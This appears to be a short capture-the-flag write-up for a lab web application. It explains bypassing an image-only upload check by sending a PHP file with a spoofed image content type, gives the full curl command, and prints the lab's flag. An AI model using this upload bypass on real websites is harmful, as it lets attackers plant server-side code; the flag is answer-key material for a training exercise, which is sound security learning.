**http://10.0.0.12/?page=upload**

The functionality here only accepts image files.
When anyother file such as a php file is uploaded, an error message is returned.

This can be circumnavigated with the help of the cURL terminal command.
_curl -F 'Upload=submit' -F 'uploaded=@thisfile.php;type=image/jpeg' http://10.0.0.12/?page=upload#_
The above command uploads a php file called thisfile.php to the page successfully.

After this has been done, a flag is returned.

**FLAG:
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8**

https://curl.se/mail/archive-2003-04/0135.html
https://ec.haxx.se/http/http-cheatsheet
